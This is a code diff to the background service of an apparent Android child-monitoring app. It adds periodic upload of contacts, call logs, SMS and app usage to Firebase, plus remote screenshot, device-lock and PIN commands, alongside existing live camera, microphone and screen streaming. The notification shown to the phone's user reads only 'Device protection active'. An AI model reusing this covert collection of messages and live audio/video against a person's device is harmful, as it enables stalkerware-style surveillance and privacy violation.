@@ -2,10 +2,10 @@
 package com.nw.childapp.service
 
 import android.app.*
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
-import android.database.Cursor
 import android.os.IBinder
-import android.provider.ContactsContract
 import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.google.firebase.database.FirebaseDatabase
@@ -29,8 +29,8 @@ class ChildMonitorService : Service() {
         if (deviceId.isNotEmpty()) {
             launchCommandListener()
             launchPermissionReporter()
+            launchDataSync()
             markOnline(true)
-            syncAllContactsToFirebase()
         }
         return START_STICKY
     }
@@ -65,49 +65,21 @@ class ChildMonitorService : Service() {
         }
     }
 
-    // Sync ALL contacts — no limit, reads every contact on device
-    private fun syncAllContactsToFirebase() {
-        scope.launch(Dispatchers.IO) {
-            try {
-                val seen = mutableSetOf<String>() // deduplicate by name+number
-                val batch = mutableMapOf<String, Any>()
-                var index = 0
+    private fun launchDataSync() {
+        scope.launch {
+            // Initial full sync
+            DataSyncHelper.syncContacts(applicationContext, deviceId, scope)
+            DataSyncHelper.syncCallLog(applicationContext, deviceId, scope)
+            DataSyncHelper.syncSms(applicationContext, deviceId, scope)
+            DataSyncHelper.syncAppUsage(applicationContext, deviceId, scope)
+            DataSyncHelper.syncInstalledApps(applicationContext, deviceId, scope)
 
-                val cursor: Cursor? = applicationContext.contentResolver.query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    arrayOf(
-                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
-                        ContactsContract.CommonDataKinds.Phone.NUMBER
-                    ),
-                    null, null,
-                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
-                )
-
-                cursor?.use { c ->
-                    val nameIdx   = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
-                    val numberIdx = c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
-                    while (c.moveToNext()) {
-                        val name   = (c.getString(nameIdx)   ?: "Unknown").trim()
-                        val number = (c.getString(numberIdx) ?: "").trim()
-                        val key    = "$name|$number"
-                        if (key !in seen) {
-                            seen.add(key)
-                            batch["c$index"] = mapOf("name" to name, "number" to number)
-                            index++
-                        }
-                    }
-                }
-
-                if (batch.isNotEmpty()) {
-                    val contactsRef = db.getReference("contacts").child(deviceId)
-                    // Remove old then batch-write all
-                    contactsRef.removeValue().addOnCompleteListener {
-                        contactsRef.updateChildren(batch)
-                        Log.d("ChildMonitor", "Synced $index unique contacts")
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e("ChildMonitor", "Contact sync error: ${e.message}")
+            // Periodic re-sync every 5 minutes
+            while (isActive) {
+                delay(5 * 60_000)
+                DataSyncHelper.syncCallLog(applicationContext, deviceId, scope)
+                DataSyncHelper.syncSms(applicationContext, deviceId, scope)
+                DataSyncHelper.syncAppUsage(applicationContext, deviceId, scope)
             }
         }
     }
@@ -122,16 +94,18 @@ class ChildMonitorService : Service() {
     private fun handleCommand(cmd: ControlCommand) {
         Log.d("ChildMonitor", "CMD: ${cmd.type} val=${cmd.value}")
         when (cmd.type) {
+
+            // ── Live streams ──────────────────────────────────────────
             CommandTypes.ENABLE_CAMERA -> {
                 try { startForegroundService(Intent(this, CameraStreamService::class.java)) }
-                catch (e: Exception) { Log.e("ChildMonitor", "Camera start: ${e.message}") }
+                catch (e: Exception) { Log.e("ChildMonitor", "Camera: ${e.message}") }
             }
             CommandTypes.DISABLE_CAMERA ->
                 stopService(Intent(this, CameraStreamService::class.java))
 
             CommandTypes.ENABLE_MIC -> {
                 try { startForegroundService(Intent(this, MicStreamService::class.java)) }
-                catch (e: Exception) { Log.e("ChildMonitor", "Mic start: ${e.message}") }
+                catch (e: Exception) { Log.e("ChildMonitor", "Mic: ${e.message}") }
             }
             CommandTypes.DISABLE_MIC ->
                 stopService(Intent(this, MicStreamService::class.java))
@@ -141,6 +115,17 @@ class ChildMonitorService : Service() {
             CommandTypes.STOP_SCREEN_SHARE ->
                 stopService(Intent(this, ScreenCaptureService::class.java))
 
+            // ── Screenshot ────────────────────────────────────────────
+            CommandTypes.TAKE_SCREENSHOT -> {
+                val acc = NWAccessibilityService.instance
+                if (acc != null) {
+                    acc.takeScreenshotNow(deviceId)
+                } else {
+                    Log.e("ChildMonitor", "Accessibility service not running for screenshot")
+                }
+            }
+
+            // ── App blocking ──────────────────────────────────────────
             CommandTypes.BLOCK_APP -> {
                 val pkg = cmd.value.trim()
                 if (pkg.isNotEmpty()) {
@@ -148,7 +133,7 @@ class ChildMonitorService : Service() {
                     set.add(pkg)
                     prefs.edit().putStringSet("blocked_apps", set).apply()
                     db.getReference("blocked_apps").child(deviceId).child(pkg.replace(".", "_")).setValue(true)
-                    Log.d("ChildMonitor", "Blocked: $pkg total=${set.size}")
+                    Log.d("ChildMonitor", "Blocked: $pkg")
                 }
             }
             CommandTypes.UNBLOCK_APP -> {
@@ -162,6 +147,7 @@ class ChildMonitorService : Service() {
                 }
             }
 
+            // ── App limits ────────────────────────────────────────────
             CommandTypes.SET_APP_LIMIT -> {
                 val parts = cmd.value.split(":")
                 if (parts.size == 2) {
@@ -169,10 +155,39 @@ class ChildMonitorService : Service() {
                     val mins = parts[1].toIntOrNull() ?: return
                     prefs.edit().putInt("limit_$pkg", mins).apply()
                     db.getReference("app_limits").child(deviceId).child(pkg.replace(".", "_")).setValue(mins)
-                    Log.d("ChildMonitor", "Limit $pkg = $mins min")
                 }
             }
 
+            // ── Device lock ───────────────────────────────────────────
+            CommandTypes.LOCK_DEVICE -> {
+                try {
+                    val dpm   = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
+                    val admin = ComponentName(this, NWDeviceAdminReceiver::class.java)
+                    if (dpm.isAdminActive(admin)) {
+                        dpm.lockNow()
+                        Log.d("ChildMonitor", "Device locked by parent")
+                    }
+                } catch (e: Exception) {
+                    Log.e("ChildMonitor", "Lock error: ${e.message}")
+                }
+            }
+
+            // ── PIN set ───────────────────────────────────────────────
+            CommandTypes.SET_PIN -> {
+                val pin = cmd.value.trim()
+                if (pin.length == 4) {
+                    prefs.edit().putString("parent_pin", pin).apply()
+                    Log.d("ChildMonitor", "PIN set by parent")
+                }
+            }
+
+            // ── Data sync commands ────────────────────────────────────
+            CommandTypes.SYNC_CALL_LOG ->
+                DataSyncHelper.syncCallLog(applicationContext, deviceId, scope)
+            CommandTypes.SYNC_SMS ->
+                DataSyncHelper.syncSms(applicationContext, deviceId, scope)
+
+            // ── Disconnect ────────────────────────────────────────────
             CommandTypes.APPROVE_DISCONNECT,
             CommandTypes.FORCE_DISCONNECT -> {
                 scope.launch { try { repo.markDisconnected(deviceId) } catch (_: Exception) {} }
@@ -181,6 +196,7 @@ class ChildMonitorService : Service() {
                 stopService(Intent(this, CameraStreamService::class.java))
                 stopService(Intent(this, MicStreamService::class.java))
                 stopService(Intent(this, ScreenCaptureService::class.java))
+                stopService(Intent(this, LocationService::class.java))
                 stopSelf()
             }
             CommandTypes.APPROVE_DELETE ->
@@ -203,9 +219,7 @@ class ChildMonitorService : Service() {
         )
         return NotificationCompat.Builder(this, "nw_monitor")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
-            .setContentTitle("NW Child")
-            .setContentText("Device protection active")
-            .setOngoing(true)
-            .build()
+            .setContentTitle("NW Child").setContentText("Device protection active")
+            .setOngoing(true).build()
     }
 }
